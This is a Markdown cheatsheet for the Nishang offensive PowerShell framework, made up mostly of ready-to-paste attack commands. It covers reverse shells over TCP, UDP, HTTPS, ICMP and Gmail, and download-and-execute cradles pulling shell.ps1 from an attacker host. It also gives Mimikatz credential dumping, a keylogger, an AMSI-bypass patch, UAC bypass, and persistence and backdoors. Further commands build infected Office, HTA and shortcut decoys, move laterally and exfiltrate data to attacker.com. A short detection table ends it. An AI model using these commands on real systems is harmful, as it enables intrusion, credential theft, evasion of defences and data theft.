# Nishang Cheatsheet — Offensive PowerShell Framework

## Quick Start

```powershell
# Load all scripts
Import-Module .\nishang.psm1

# Load single script
. .\Shells\Invoke-PowerShellTcp.ps1

# Get help
Get-Help <FunctionName> -Full
```

## Reverse Shells

### TCP Reverse Shell
```powershell
# Listener (Kali)
nc -lvnp 4444

# Target
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444
```

### TCP One-Liner
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444"
```

### UDP Reverse Shell
```powershell
Invoke-PowerShellUdp -Reverse -IPAddress 192.168.1.100 -Port 4444
```

### HTTPS Reverse Shell
```powershell
# Kali: python3 -m http.server 8080
Invoke-PoshRatHttps -IPAddress 192.168.1.100 -Port 8443
```

### HTTP Reverse Shell
```powershell
Invoke-PoshRatHttp -IPAddress 192.168.1.100 -Port 8080
```

### ICMP Reverse Shell
```powershell
Invoke-PowerShellIcmp -IPAddress 192.168.1.100
```

### Gmail-Based Shell
```powershell
# Agent on target
Invoke-PsGcatAgent -UserName you@gmail.com -Password pass -Port 993

# Controller on Kali
Invoke-PsGcat -UserName you@gmail.com -Password pass -ComputerName target
```

## Credential Harvesting

```powershell
# Dump hashes (requires SYSTEM)
Invoke-Mimikatz

# WDigest downgrade
Invoke-MimikatzWDigestDowngrade

# LSA secrets
Get-LSASecret

# Password hints
Get-PassHints

# WLAN keys
Get-WLAN-Keys

# Keylogger
Start-KeyLogger
# Stop: Ctrl+C in the PS window
Parse_Keys (keys.log)
```

## Information Gathering

```powershell
# Full system info
Get-Information

# Check if VM
Check-VM

# Screen capture
Show-TargetScreen -Reverse -IPAddress 192.168.1.100 -Port 4444

# Browser memory extraction
Invoke-Mimikittenz

# Session gopher (find admin jump-boxes)
Invoke-SessionGopher
```

## Backdoors

```powershell
# HTTP backdoor
HTTP-Backdoor -IPAddress 192.168.1.100 -Port 8080 -URL http://192.168.1.100/tasks

# DNS TXT backdoor
DNS_TXT_Pwnage -IPAddress 192.168.1.100 -DomainName c2.attacker.com

# Execute at specific time
Execute-OnTime -Time 14:30 -Command "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"

# Screen saver backdoor
Add-ScrnSaveBackdoor -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"

# Registry backdoor (Sticky Keys)
Add-RegBackdoor -TriggerWord "utilman"

# ADS backdoor
Invoke-ADSBackdoor -ADSName "hidden.ps1" -Payload "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
```

## Persistence

```powershell
# Add persistence to any script
. .\Utility\Add-Persistence.ps1
Add-Persistence -ScriptToPersist .\shell.ps1 -PersistenceType ScheduledTask -TaskName "Updater"

# Remove persistence
Remove-Persistence -TaskName "Updater"
```

## Privilege Escalation

```powershell
# Bypass UAC
Invoke-PsUACme -Method fubuki -Command "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/priv.ps1')"

# Duplicate token for SYSTEM
Enable-DuplicateToken

# Remove security patches
Remove-Update -Patch "KB2999226"
```

## AMSI Bypass

```powershell
# Known AMSI bypass methods
. .\Bypass\Invoke-AmsiBypass.ps1
Invoke-AmsiBypass

# Manual patch
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

## Decoy Documents

```powershell
# Infected Word
Out-Word -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')" -Remove

# Infected Excel
Out-Excel -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"

# Infected HTA
Out-HTA -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"

# Infected Shortcut
Out-Shortcut -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"

# Infected CHM
Out-CHM -Payload "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')"
```

## Scanning

```powershell
# Port scan
Port-Scan -StartAddress 192.168.1.1 -EndAddress 192.168.1.254 -Ports 21,22,80,445,3389

# Brute force
Brute-Force -UserName admin -Passwords pass.txt -URL http://192.168.1.100/login
```

## Lateral Movement

```powershell
# Create sessions to multiple hosts
Create-MultipleSessions -UserNames admin -Password pass123 -ComputerNames 192.168.1.201,192.168.1.202

# Execute on remote host
Run-EXEonRemote -ComputerName 192.168.1.201 -UserName admin -Password pass123 -File .\payload.exe

# Network relay
Invoke-NetworkRelay -FromPort 3389 -ToHost 10.10.10.5 -ToPort 3389

# Set remote WMI access
Set-RemoteWMI -UserName lowpriv

# Set remote PS remoting
Set-RemotePSRemoting -UserName lowpriv
```

## Encoding & Obfuscation

```powershell
# Encode script
Invoke-Encode -DataToEncode C:\payload.ps1 -OutCommand

# Decode script
Invoke-Decode -DecodingFileName C:\encoded.txt -OutCommandFileName C:\decoded.ps1

# Base64 encode
StringToBase64 "text"

# Base64 decode
Base64ToString "base64string"

# Convert exe to text
ExetoText payload.exe payload.txt

# Convert text to exe
TexttoExe payload.txt payload.exe

# ROT13
ConvertTo-ROT13 -String "text"
```

## Data Exfiltration

```powershell
# Add exfiltration to any script
Add-Exfiltration -ScriptToMutate C:\gather.ps1 -ExfilOption DNS -DNSHostName attacker.com

# Pipe exfiltration
Get-Information | Do-Exfiltration -ExfilOption WebServer -URL http://192.168.1.100:8080

# SSID exfiltration
Invoke-SSIDExfil -DataToExfil "secret data" -SSIDName "MyWiFi"
```

## Utility

```powershell
# Transfer file to target
Download -URL http://192.168.1.100:8080/file.exe -OutFile C:\temp\file.exe

# Capture server (logs NTLM hashes)
Start-CaptureServer -Port 80

# Generate DNS TXT records
Out-DnsTxt -DataToEncode C:\payload.ps1
```

## In-Memory Execution Patterns

```powershell
# Method 1: Download and execute
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')

# Method 2: Download and execute (Invoke-WebRequest)
IEX(Invoke-WebRequest -Uri 'http://192.168.1.100/script.ps1' -UseBasicParsing)

# Method 3: Encoded command
powershell -e <base64_encoded_command>

# Method 4: Download cradle
(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/file.exe','C:\temp\file.exe')
```

## Powerpreter (All-in-One)

```powershell
# Load entire Nishang framework
. .\powerpreter\powerpreter.ps1
```

## Common One-Liners

```powershell
# Reverse shell one-liner
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"

# AMSI bypass + shell
powershell -ep bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"

# Execute from encoded script
powershell -ep bypass -e <base64_encoded_command>
```

## Detection Indicators

| Indicator | Event ID | Log Source |
|-----------|----------|------------|
| PowerShell execution | 4688 | Security |
| Script block logging | 4104 | Windows PowerShell |
| Module logging | 4103 | Windows PowerShell |
| AMSI detection | 1116 | Windows Defender |
| Unusual outbound connection | - | Sysmon / Firewall |

## Quick Reference

| Function | Purpose | Requires |
|----------|---------|----------|
| `Invoke-PowerShellTcp` | TCP reverse/bind shell | Network |
| `Invoke-PowerShellUdp` | UDP reverse/bind shell | Network |
| `Invoke-PoshRatHttps` | HTTPS reverse shell | Network |
| `Invoke-Mimikatz` | Dump credentials | SYSTEM |
| `Get-PassHashes` | Extract NTLM hashes | SYSTEM |
| `Get-WLAN-Keys` | Get WiFi passwords | Admin |
| `Invoke-AmsiBypass` | Bypass AMSI | None |
| `Out-Word` | Create infected .docx | None |
| `Out-HTA` | Create phishing HTA | None |
| `Invoke-PsUACme` | Bypass UAC | None |
| `Port-Scan` | Internal port scan | None |
| `Brute-Force` | Password brute force | None |
| `Get-Information` | System recon | None |
| `Check-VM` | Detect virtual machine | None |
